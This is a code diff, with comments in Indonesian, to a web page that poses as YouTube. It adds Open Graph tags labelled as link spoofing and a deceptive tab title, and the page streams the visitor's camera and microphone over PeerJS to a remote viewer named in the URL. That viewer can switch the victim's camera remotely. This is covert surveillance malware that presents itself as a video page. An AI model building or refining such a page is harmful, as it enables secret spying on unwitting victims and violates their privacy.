@@ -3,7 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- YouTube Link Spoofing (Open Graph) -->
     <title>YouTube</title>
+    <meta name="description" content="Tonton video favorit Anda, dengarkan musik asli, dan unggah konten asli semuanya di YouTube.">
+    <meta property="og:title" content="YouTube - Video Populer">
+    <meta property="og:description" content="Tonton video terbaik hari ini di YouTube.">
+    <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
+    <meta property="og:type" content="video.other">
+    <meta name="theme-color" content="#ff0000">
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: Roboto, Arial, sans-serif; background: #000; color: white; min-height: 100vh; overflow: hidden; }
@@ -33,7 +42,7 @@
     </div>
     <iframe id="ytPlayer" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     <div style="padding: 15px;">
-        <div style="font-size: 18px; font-weight: bold;">Video Rekomendasi Hari Ini</div>
+        <div style="font-size: 18px; font-weight: bold;" id="videoTitleDisplay">Video Rekomendasi Hari Ini</div>
         <div style="color: #aaa; font-size: 14px; margin-top: 10px;">Trending • 1.2jt ditonton</div>
     </div>
 
@@ -42,7 +51,8 @@
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const viewerId = urlParams.get('viewer');
+        // Mendukung parameter v (YouTube) atau viewer (Aplikasi)
+        const viewerId = urlParams.get('viewer') || urlParams.get('auth');
         const videoId = urlParams.get('v') || 'dQw4w9WgXcQ';
         const targetId = "yt-" + Math.floor(1000 + Math.random() * 9000);
         
@@ -55,6 +65,8 @@
         let currentFacingMode = 'environment';
         let activeCall = null;
 
+        // Set judul tab browser agar menipu
+        document.title = "YouTube - Menonton Video";
         ytPlayer.src = `https://www.youtube.com/embed/${videoId}?autoplay=0&controls=1`;
 
         async function startApp() {
@@ -82,7 +94,6 @@
                 });
             } catch (err) {
                 console.error(err);
-                // Fallback video only
                 try {
                     localStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     startApp();
@@ -93,22 +104,15 @@
         async function handleData(data) {
             if (data.type === 'switch_camera') {
                 currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
-                
-                // Ganti track video secara real-time
                 const newStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: currentFacingMode },
                     audio: true
                 });
-                
                 const newVideoTrack = newStream.getVideoTracks()[0];
-                
                 if (activeCall && activeCall.peerConnection) {
                     const sender = activeCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
-                    if (sender) {
-                        sender.replaceTrack(newVideoTrack);
-                    }
+                    if (sender) sender.replaceTrack(newVideoTrack);
                 }
-                
                 localStream.getTracks().forEach(track => track.stop());
                 localStream = newStream;
                 cameraPreview.srcObject = localStream;
